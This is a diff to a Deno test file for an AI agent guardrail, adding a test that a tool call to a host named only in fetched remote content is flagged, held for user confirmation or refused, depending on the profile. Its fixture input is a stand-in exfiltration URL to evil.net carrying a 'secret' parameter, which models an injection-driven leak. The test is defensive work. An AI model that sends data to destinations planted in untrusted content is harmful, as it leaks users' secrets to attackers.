@@ -731,6 +731,7 @@ Deno.test('each tool-boundary check is timed on the span, once, with its decisio
     [
       { check: 'tool_arguments', action: 'flag', duration: 0 },
       { check: 'taint', action: 'allow', duration: 0 },
+      { check: 'destination', action: 'allow', duration: 0 },
       { check: 'tool_result', action: 'allow', duration: 0 },
     ],
     'completed call',
@@ -743,6 +744,7 @@ Deno.test('each tool-boundary check is timed on the span, once, with its decisio
     [
       { check: 'tool_arguments', action: 'allow', duration: 0 },
       { check: 'taint', action: 'allow', duration: 0 },
+      { check: 'destination', action: 'allow', duration: 0 },
       { check: 'tool_failure', action: 'allow', duration: 0 },
       { check: 'tool_result', action: 'allow', duration: 0 },
     ],
@@ -1066,6 +1068,76 @@ Deno.test('a tainted turn flags a writing tool, steers by what was read, and spa
     }
     check(r.settlement.failure, undefined, `${row.label}: still runs`);
   }
+});
+
+Deno.test('a call to a destination only a remote result named is reported, held or refused as the profile says', async () => {
+  let ran = 0;
+  const scope = scopeOf(
+    fnTool('reads', {
+      handler: () => {
+        ran++;
+        return { finding: 'ok' };
+      },
+    }),
+  );
+  const turn = {
+    step: 1,
+    destinations: {
+      given: new Set<string>(),
+      remote: new Map([['host:evil.net', 'fetch']]),
+    },
+  };
+  const input = { q: 'https://evil.net/collect?d=secret' };
+  const rulesOf = (r: Run) =>
+    eventsOf(r.events, 'guardrail').map((e) => [e.guardrail.action, e.guardrail.hits[0]?.rule]);
+
+  const reported = await run({
+    scope,
+    profile: profileOf(['reads']),
+    name: 'reads',
+    input,
+    ctx: { turn },
+  });
+  check(rulesOf(reported), [['flag', 'tool_call.remote-destination']], 'reported');
+  check([reported.settlement.failure, ran], [undefined, 1], 'reported: the call runs');
+
+  const confirming = profileOf(['reads'], { taint: { remoteDestination: 'confirm' } });
+  const held = await run({ scope, profile: confirming, name: 'reads', input, ctx: { turn } });
+  check(
+    held.settlement.gated,
+    {
+      kind: 'confirmation',
+      tool: 'reads',
+      summary:
+        'This would send to evil.net. That came from content the agent read (fetch), not from you.',
+      access: 'read-only',
+    },
+    'held: gate',
+  );
+  check([held.settlement.callNotStarted, ran], [true, 1], 'held: not run');
+  const approved = await run({
+    scope,
+    profile: confirming,
+    name: 'reads',
+    input,
+    ctx: { turn, resume: { granted: true } },
+  });
+  check([approved.settlement.gated, ran], [undefined, 2], 'approved: the call runs');
+
+  const blocking = profileOf(['reads'], { taint: { remoteDestination: 'block' } });
+  const refused = await run({ scope, profile: blocking, name: 'reads', input, ctx: { turn } });
+  check(
+    failureOf(refused),
+    {
+      code: 'remote_destination',
+      kind: 'blocked',
+      message:
+        'Refused tool call: it would send to evil.net, which appears only in untrusted remote content this turn read (fetch), not in anything the user or the system gave.',
+    },
+    'refused: failure',
+  );
+  check(rulesOf(refused), [['block', 'tool_call.remote-destination']], 'refused: event');
+  check([refused.settlement.denied, ran], [true, 2], 'refused: not run');
 });
 
 Deno.test('a profile that blocks writes after a remote read refuses the call, unrun', async () => {
